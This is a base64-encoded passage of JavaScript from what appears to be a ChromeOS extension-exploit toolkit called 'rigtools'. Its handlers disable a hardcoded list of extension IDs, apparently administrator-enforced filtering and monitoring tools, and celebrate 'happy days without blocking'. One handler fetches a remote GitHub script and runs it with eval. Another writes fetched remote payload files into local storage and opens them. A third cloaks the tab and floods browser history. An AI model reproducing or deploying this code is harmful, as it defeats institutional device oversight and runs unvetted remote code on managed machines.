bnRfZGlzYWJsZV9leHQiCiAgICAgICAgKTsKCiAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI2N1cnJlbnQtZXh0ZW5zaW9uIikub25jbGljayA9CiAgICAgICAgICAgIGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZ3JhYmlkdG9raWxsID0gY2hyb21lLnJ1bnRpbWUuaWQ7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChncmFiaWR0b2tpbGwsIGZhbHNlKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIGFsZXJ0KCJ1bnN1Y2Nlc3NmdWwiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKCiAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI3Jtdi1jbW4tYmx0Iikub25jbGljayA9IGZ1bmN0aW9uIGRmKCkgewogICAgICAgICAgICBjb25zdCBibG9hdElkcyA9IFsKICAgICAgICAgICAgICAgICJjZ2JiYmptZ2RwbmlmaWpjb25oYW1nZ2plaGxhbWNpZiIsCiAgICAgICAgICAgICAgICAibGZrYmJtY2xucGFpaHBhYWpob2hoZmRqZWxjaGtpa2YiLAogICAgICAgICAgICAgICAgIm5jYm9mbmhtbWZmZm1jZG1iamZhaWdlcGtnbWpubG5lIiwKICAgICAgICAgICAgICAgICJwb2htZ29iZGVhamVtY2lmcG9sZG5uaGZmam5ua2hnZiIsCiAgICAgICAgICAgICAgICAiYmVjZHBsZmFsb29mbGFuaXBqb2JsY21wYWVra2JiaGUiLAogICAgICAgICAgICAgICAgImZlZXBtZGxtaHBsYW9qYWJlb2VjYW9iZm1pYm9vYWlkIiwKICAgICAgICAgICAgICAgICJhZGtjcGtwZ2hhaG1ib3BramNob2JpZWNrZW9hb2VlbSIsCiAgICAgICAgICAgICAgICAiaGFsZGxnbGRwbGduZ2dramFhZmhlbGdpYWdsYWZhbmgiLAogICAgICAgICAgICAgICAgImZpbGdwamtkbWppbm1qYmVwYnBtbmZvYm1qbWdpbW9uIiwKICAgICAgICAgICAgICAgICJra2JtZGdqZ2djZGFqY2tkbGJuZ2Rqb25wY2hwYWllYSIsCiAgICAgICAgICAgICAgICAibmpkbmljbGdlZ2lqZGNkbGlrbGdpZWljYW5wbWNuZ2oiLAogICAgICAgICAgICAgICAgImhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiwKICAgICAgICAgICAgXTsKCiAgICAgICAgICAgIGxldCBleHRzID0ge307CiAgICAgICAgICAgIGxldCBleHRsbmd0aCA9IDA7CgogICAgICAgICAgICBmdW5jdGlvbiBnZXRMZW5ndGgoKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgICAgICAgICAgICBibG9hdElkcy5mb3JFYWNoKChpZCwgaSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBleHRlbnNpb25FeGlzdHMoaWQpLnRoZW4oKHJlcykgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcykgZXh0bG5ndGgrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChibG9hdElkcy5sZW5ndGggLSAxID09PSBpKSByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGluaXRFeHRPYmooKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgICAgICAgICAgICBibG9hdElkcy5mb3JFYWNoKChpZCkgPT4KICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihleHRzLCBKU09OLnBhcnNlKGB7IiR7ZS5pZH0iOiIke2Uuc2hvcnROYW1lfSJ9YCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKGV4dHMpLmxlbmd0aCA9PSBleHRsbmd0aCkgcmVzb2x2ZSgpOwogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZ2V0TGVuZ3RoKCkudGhlbigoKSA9PgogICAgICAgICAgICAgICAgaW5pdEV4dE9iaigpLnRoZW4oKCkgPT4KICAgICAgICAgICAgICAgICAgICBtYWtlRGlhbG9nKAogICAgICAgICAgICAgICAgICAgICAgICAiQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIGRpc2FibGUgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zPyIsCiAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC52YWx1ZXMoZXh0cyksCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkge30sCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRpc2FibGVkRXh0cyA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoZXh0cykuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlLmVuYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpZCA9PSBjaHJvbWUucnVudGltZS5pZCkgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5wdXNoKGUuc2hvcnROYW1lKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFkaXNhYmxlZEV4dHMubGVuZ3RoIDwgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGlzYWJsZWQgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zOlxyXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5qb2luKCJcclxuIiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMubGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDI1MCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICk7CiAgICAgICAgfTsKCiAgICAgICAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikgPT0gSlNPTi5zdHJpbmdpZnkoW10pKSB7CiAgICAgICAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zCiAgICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAgIC5zZXRBdHRyaWJ1dGUoInN0eWxlIiwgImRpc3BsYXk6IG5vbmU7Iik7CiAgICAgICAgfQoKICAgICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjZGlzYWJsZS11c2VyZGVmLWV4dHMiKS5vbmNsaWNrID0KICAgICAgICAgICAgZnVuY3Rpb24gZGYoZSkgewogICAgICAgICAgICAgICAgbGV0IGV4dHMgPSB7fTsKCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBpbml0RXh0T2JqKCkgewogICAgICAgICAgICAgICAgICAgIGxldCBpZGxpc3QgPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBpZGxpc3QuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKGV4dHMsIEpTT04ucGFyc2UoYHsiJHtlLmlkfSI6IiR7ZS5zaG9ydE5hbWV9In1gKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKGV4dHMpLmxlbmd0aCA9PSBpZGxpc3QubGVuZ3RoKSByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaW5pdEV4dE9iaigpLnRoZW4oKCkgPT4gewogICAgICAgICAgICAgICAgICAgIG1ha2VEaWFsb2coCiAgICAgICAgICAgICAgICAgICAgICAgICJBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGlzYWJsZSB0aGUgZm9sbG93aW5nIGV4dGVuc2lvbnM/IiwKICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LnZhbHVlcyhleHRzKSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7fSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlzYWJsZWRFeHRzID0gW107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZS5lbmFibGVkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMucHVzaChlLnNob3J0TmFtZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGlkLCBmYWxzZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZGlzYWJsZWRFeHRzLmxlbmd0aCA8IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRpc2FibGVkIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9uczpcclxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMuam9pbigiXHJcbiIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLmxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAyNTApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9OwogICAgfQogICAgY29uc3Qgb3RoZXJGZWF0dXJlcyA9IHdpbmRvdy5jaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpOwogICAgY29uc3QgcGVybWlzc2lvbnMgPSBvdGhlckZlYXR1cmVzLnBlcm1pc3Npb25zOwoKICAgIG5ldyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzKCkuYWN0aXZhdGUoKTsKICAgIGRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKAogICAgICAgICJiZWZvcmVlbmQiLAogICAgICAgIGAKICAgICAgPHRpdGxlPlVudGl0bGVkIGRvY3VtZW50PC90aXRsZT4KICAgICAgPGRpdiBjbGFzcz0iYmFja2dyb3VuZC1ncmlkIj48L2Rpdj4KICAgICAgPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi8iPgogICAgICBgCiAgICApOwoKICAgIGNvbnN0IFNjcmlwdEJ1dHRvbnMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjb3RoZXItYnV0dG9ucyIpOwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3N3YW1wIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICBmZXRjaCgKICAgICAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9zY3JpcHRzL3N3YW1wLXVsdHJhLmpzIgogICAgICAgICAgICApCiAgICAgICAgICAgIC50aGVuKChyZXMpID0+IHJlcy50ZXh0KCkpCiAgICAgICAgICAgIC50aGVuKGV2YWwpOwogICAgfTsKCiAgICBTY3JpcHRCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiN1cGRhdGUiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIChhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGZzID0gYXdhaXQgbmV3IFByb21pc2UoZnVuY3Rpb24ocmVzb2x2ZSkgewogICAgICAgICAgICAgICAgd2Via2l0UmVxdWVzdEZpbGVTeXN0ZW0oUEVSU0lTVEVOVCwgMiAqIDEwMjQgKiAxMDI0LCByZXNvbHZlKTsKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24od3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgY29uc3QgdXJsID0gYXdhaXQgd3JpdGVGaWxlKAogICAgICAgICAgICAgICAgInJpZ3Rvb2xzLmh0bWwiLAogICAgICAgICAgICAgICAgYCR7YXdhaXQgZmV0Y2goCiAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vcGF5bG9hZHMvaW5kZXguaHRtbCIKICAgICAgICApLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSl9PHNjcmlwdCBzcmM9Ii4vcmlndG9vbHMuanMiPjwvc2NyaXB0PmAKICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIGF3YWl0IHdyaXRlRmlsZSgKICAgICAgICAgICAgICAgICJyaWd0b29scy5qcyIsCiAgICAgICAgICAgICAgICBhd2FpdCBmZXRjaCgKICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vcGF5bG9hZHMvaW5kZXguanMiCiAgICAgICAgICAgICAgICApLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSkKICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIGNocm9tZS50YWJzLmNyZWF0ZSh7CiAgICAgICAgICAgICAgICB1cmwKICAgICAgICAgICAgfSk7CiAgICAgICAgfSkoKTsKICAgIH07CiAgICBTY3JpcHRCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiNxdWljay1ybXYtYmx0Iikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICAoYXN5bmMgKCkgPT4gewoKICAgICAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBuZXcgUHJvbWlzZShmdW5jdGlvbiAocmVzb2x2ZSkgewogICAgICAgICAgICAgICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24gKHdyaXRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci5vbndyaXRlZW5kID0gcmVzb2x2ZS5iaW5kKG51bGwsIGVudHJ5LnRvVVJMKCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IEpTID0gYHRyeSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgYmxvYXRJZHMgPSBbCiAgICAgICAgICAgICAgICAgICAgICAiY2diYmJqbWdkcG5pZmlqY29uaGFtZ2dqZWhsYW1jaWYiLAogICAgICAgICAgICAgICAgICAgICAgImxma2JibWNsbnBhaWhwYWFqaG9oaGZkamVsY2hraWtmIiwKICAgICAgICAgICAgICAgICAgICAgICJuY2JvZm5obW1mZmZtY2RtYmpmYWlnZXBrZ21qbmxuZSIsCiAgICAgICAgICAgICAgICAgICAgICAicG9obWdvYmRlYWplbWNpZnBvbGRubmhmZmpubmtoZ2YiLAogICAgICAgICAgICAgICAgICAgICAgImJlY2RwbGZhbG9vZmxhbmlwam9ibGNtcGFla2tiYmhlIiwKICAgICAgICAgICAgICAgICAgICAgICJmZWVwbWRsbWhwbGFvamFiZW9lY2FvYmZtaWJvb2FpZCIsCiAgICAgICAgICAgICAgICAgICAgICAiYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iLAogICAgICAgICAgICAgICAgICAgICAgImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiwKICAgICAgICAgICAgICAgICAgICAgICJmaWxncGprZG1qaW5tamJlcGJwbW5mb2Jtam1naW1vbiIsCiAgICAgICAgICAgICAgICAgICAgICAia2tibWRnamdnY2RhamNrZGxibmdkam9ucGNocGFpZWEiLAogICAgICAgICAgICAgICAgICAgICAgIm5qZG5pY2xnZWdpamRjZGxpa2xnaWVpY2FucG1jbmdqIiwKICAgICAgICAgICAgICAgICAgICAgICJocGtkb2tha2pnbHBwZWVrZmVla21lYmZhaGFkbmZscCIKICAgICAgICAgICAgICAgICAgICBdOwogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBibG9hdElkcy5mb3JFYWNoKChpZCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgaWYgKGlkID09IGNocm9tZS5ydW50aW1lLmlkKSByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB3aW5kb3cuY2xvc2UoKTsKICAgICAgICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgYWxlcnQoInVuc3VjY2Vzc2Z1bCIpOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIGA7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCBmaWxlTmFtZSA9ICJibG9hdCI7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoYCR7ZmlsZU5hbWV9Lmh0bWxgLGA8IWRvY3R5cGVodG1sPjx0aXRsZT5kaXNhYmxpbmcuLjwvdGl0bGU+PGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1JbnRlcjppdGFsLG9wc3osd2dodEAwLDE0Li4zMiwxMDAuLjkwMDsxLDE0Li4zMiwxMDAuLjkwMCZkaXNwbGF5PXN3YXAicmVsPXN0eWxlc2hlZXQ+PHN0eWxlPnB7bWFyZ2luOjB9Ym9keXtiYWNrZ3JvdW5kLWNvbG9yOiMwMDA7Y29sb3I6I2ZmZjtmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmO21hcmdpbjowO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtoZWlnaHQ6MTAwdmh9aDE6OmJlZm9yZXtjb250ZW50OiIjICI7Y29sb3I6b2tsY2goODEuMjElIC4xNDA5IDE2NS4xNCk7Zm9udC13ZWlnaHQ6OTAwfS5pbm5lcntkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO3RleHQtYWxpZ246Y2VudGVyfXRleHRhcmVhe3dpZHRoOm1heC1jb250ZW50O3BhZGRpbmctdG9wOjFlbTtvdmVyZmxvdy15OmhpZGRlbjtib3JkZXItcmFkaXVzOjEwcHg7YmFja2dyb3VuZDpva2xjaCgxNy4wMyUgLjAwODMgMjg1LjQ5IC8gLjUpO2JvcmRlcjoxcHggc29saWQgb2tsY2goNjguNjUlIC4wMzc0IDI3NC43MyAvIC41KTtjb2xvcjpva2xjaCg5NS45MiUgLjAxOTI1MyAyNzMuMjM3Nyk7cmVzaXplOm5vbmU7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO3RyYW5zaXRpb246YWxsIC41cyBjdWJpYy1iZXppZXIoLjE3NSwuODg1LC4zMiwxLjkpLGNvbG9yIC4yNXMsYm9yZGVyLWNvbG9yIC4yNXN9PC9zdHlsZT48ZGl2IGNsYXNzPWlubmVyPjx0ZXh0YXJlYSBjb2xzPTEyIHJlYWRvbmx5IHJvd3M9Mj4gICheX19fX14pPC90ZXh0YXJlYT48aDE+ZGlzYWJsaW5nLi4uPC9oMT48cD5oYXBweSBkYXlzICB3aXRob3V0IGJsb2NraW5nIGFtIGkgcmlnaHQ/PC9kaXY+PHNjcmlwdCBzcmM9Li8ke2ZpbGVOYW1lfS5qcz48L3NjcmlwdD5gKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGF3YWl0IHdyaXRlRmlsZShgJHtmaWxlTmFtZX0uanNgLCBKUyk7CiAgICAgICAgICAgIAogICAgICAgICAgICBjaHJvbWUudGFicy5jcmVhdGUoeyB1cmwgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICB9KSgpOwogICAgfTsKCiAgICBTY3JpcHRCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiNoc3RmbGQiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIGRvY3VtZW50LnRpdGxlID0gIlVudGl0bGVkIGRvY3VtZW50IjsKICAgICAgICBsZXQgbGluayA9CiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImxpbmtbcmVsfj0naWNvbiddIikgfHwKICAgICAgICAgICAgZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGluayIpOwogICAgICAgIGxpbmsucmVsID0gImljb24iOwogICAgICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobGluayk7CiAgICAgICAgbGluay5ocmVmID0KICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi8iOwoKICAgICAgICBsZXQgbnVtID0gcHJvbXB0KAogICAgICAgICAgICAiSG93IFRpbWVzIERvIFlvdSBXYW50IFRoaXMgUGFnZSBUbyBTaG93IFVwIEluIHlvdXIgSGlzdG9yeT8iCiAgICAgICAgKTsKICAgICAgICBsZXQgZG9uZSA9IGZhbHNlOwogICAgICAgIGNvbnN0IHggPSB3aW5kb3cubG9jYXRpb24uaHJlZjsKICAgICAgICBmb3IgKGxldCBpID0gMTsgaSA8PSBudW07IGkrKykgewogICAgICAgICAgICBoaXN0b3J5LnB1c2hTdGF0ZSgwLCAwLCBpID09PSBudW0gPyB4IDogaS50b1N0cmluZygpKTsKICAgICAgICAgICAgaWYgKGkgPT09IG51bSkgZG9uZSA9IHRydWU7CiAgICAgICAgfQogICAgICAgIGlmIChkb25lKSB7CiAgICAgICAgICAgIGFsZXJ0KAogICAgICAgI